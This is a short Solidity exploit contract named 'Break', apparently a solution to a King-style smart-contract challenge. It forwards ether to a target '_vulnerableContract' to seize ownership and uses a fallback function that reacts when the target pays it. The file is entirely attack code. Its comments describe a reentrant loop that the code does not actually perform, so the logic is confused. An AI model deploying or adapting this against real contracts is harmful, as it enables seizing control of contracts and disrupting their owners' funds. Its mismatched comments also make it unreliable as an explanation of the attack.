// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;




contract Break {
    event Response(bool success, bytes data);

    address _vulnerableContract;
    constructor( address _contractAddress) {
        _vulnerableContract = _contractAddress;
    }

function takeOwnership() public payable {
 require(msg.value>0,"value should be greater than 0");

 address payable addr = payable(address(_vulnerableContract));
 (bool success, bytes memory data) = addr.call{value:msg.value}("");

    emit Response(success, data);



}
    //It will send you ether
    // you will be calling that function again when that function sends you ether
    // you will call a fallback function which calls that _king fucntion again. with some extra ether
    fallback()external payable {
    address payable addr = payable(address(_vulnerableContract));

if(msg.sender == _vulnerableContract) {
    addr.transfer(msg.value);
}

    }
   

}
